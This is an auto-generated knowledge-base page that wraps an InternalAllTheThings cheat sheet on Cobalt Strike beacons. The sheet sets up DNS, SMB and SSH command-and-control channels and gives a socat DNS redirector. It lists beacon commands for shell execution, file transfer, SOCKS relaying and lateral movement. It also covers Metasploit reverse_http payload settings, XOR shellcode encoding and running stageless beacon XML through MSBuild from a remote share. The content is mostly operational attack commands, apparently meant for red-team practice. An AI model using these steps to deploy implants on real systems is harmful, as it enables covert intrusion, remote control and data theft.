---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Cobalt Strike - Beacons

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-command-control-cobalt-strike-beacons` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/command-control/cobalt-strike-beacons.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Cobalt Strike - Beacons](../../topics/command-control/cobalt-strike-beacons.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-command-control-cobalt-strike-beacons |
| name | Cobalt Strike - Beacons |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/command-control/cobalt-strike-beacons.md |

## Preserved Source Material

````yaml
_body: "# Cobalt Strike - Beacons\n\n## DNS Beacon\n\n### DNS Configuration\n\n* Edit the `Zone File` for the domain\n* Create\
  \ an `A record` for Cobalt Strike system\n* Create an `NS record` that points to FQDN of your Cobalt Strike system\n\nYour\
  \ Cobalt Strike team server system must be authoritative for the domains you specify. Create a `DNS A` record and point\
  \ it to your Cobalt Strike team server. Use `DNS NS` records to delegate several domains or sub-domains to your Cobalt Strike\
  \ team server's `A` record.\n\nExample of DNS on Digital Ocean:\n\n```powershell\nNS  example.com                     directs\
  \ to 10.10.10.10.            86400\nNS  polling.campaigns.example.com   directs to campaigns.example.com. 3600\nA campaigns.example.com\
  \           directs to 10.10.10.10             3600 \n```\n\nAfter creating a DNS listener (`Beacon DNS`), verify that your\
  \ domains resolve to `0.0.0.0`\n\n* `nslookup jibberish.beacon polling.campaigns.domain.com`\n* `nslookup jibberish.beacon\
  \ campaigns.domain.com`\n\nIf you have trouble with DNS, you can restart the `systemd` service and force Google DNS nameservers.\n\
  \n```powershell\nsystemctl disable systemd-resolved\nsystemctl stop systemd-resolved\nrm /etc/resolv.conf\necho \"nameserver\
  \ 8.8.8.8\" >  /etc/resolv.conf\necho \"nameserver 8.8.4.4\" >>  /etc/resolv.conf\n```\n\n### DNS Redirector\n\n```ps1\n\
  socat -T 1 udp4-listen:53,fork udp4:teamserver.example.net:53\n```\n\nDebug the DNS queries with `tcpdump -l -n -s 5655\
  \ -i eth0  udp port 53`.\n\n### DNS Mode\n\n| Mode | Description |\n| --- | --- |\n| `mode dns-txt` | DNS TXT record data\
  \ channel (default) |\n| `mode dns`     | DNS A record data channel |\n| `mode dns6`    | DNS AAAA record channel |\n\n\
  ## SMB Beacon\n\n```powershell\nlink [host] [pipename]\nconnect [host] [port]\nunlink [host] [PID]\njump [exec] [host] [pipe]\n\
  ```\n\nSMB Beacon uses Named Pipes. You might encounter these error code while running it.\n\n| Error Code | Meaning   \
  \           | Description                                        |\n|------------|----------------------|----------------------------------------------------|\n\
  | 2          | File Not Found       | There is no beacon for you to link to              |\n| 5          | Access is denied\
  \     | Invalid credentials or you don't have permission   |\n| 53         | Bad Netpath          | You have no trust relationship\
  \ with the target system. It may or may not be a beacon there. |\n\n## SSH Beacon\n\n```powershell\n# deploy a beacon\n\
  beacon> help ssh\nUse: ssh [target:port] [user] [pass]\nSpawn an SSH client and attempt to login to the specified target\n\
  \nbeacon> help ssh-key\nUse: ssh [target:port] [user] [/path/to/key.pem]\nSpawn an SSH client and attempt to login to the\
  \ specified target\n\n# beacon's commands\nupload                    Upload a file\ndownload                  Download a\
  \ file\nsocks                     Start SOCKS4a server to relay traffic\nsudo                      Run a command via sudo\n\
  rportfwd                  Setup a reverse port forward\nshell                     Execute a command via the shell\n```\n\
  \n## Metasploit compatibility\n\n* Payload: `windows/meterpreter/reverse_http or windows/meterpreter/reverse_https`\n* Set\
  \ `LHOST` and `LPORT` to the beacon\n* Set `DisablePayloadHandler` to `True`\n* Set `PrependMigrate` to `True`\n* `exploit\
  \ -j`\n\n## Custom Payloads\n\n```powershell\n* Attacks > Packages > Payload Generator \n* Attacks > Packages > Scripted\
  \ Web Delivery (S)\n$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor\n$ C:\\Windows\\Microsoft.NET\\\
  Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml\n$ %windir%\\Microsoft.NET\\Framework\\\
  v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml\n```\n\n## References\n\n* [Cobalt Strike > User\
  \ Guide > DNS Beacon](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm)\n\
  * [Simple DNS Redirectors for Cobalt Strike - Thursday 11 March, 2021](https://www.cobaltstrike.com/blog/simple-dns-redirectors-for-cobalt-strike)\n\
  * [CobaltStrike DNS Beacon Lab Setup - rioasmara - March 18, 2023](https://rioasmara.com/2023/03/18/cobaltstrike-dns-beacon-lab-setup/)"
_relative_path: command-control/cobalt-strike-beacons.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/command-control/cobalt-strike-beacons.md
````
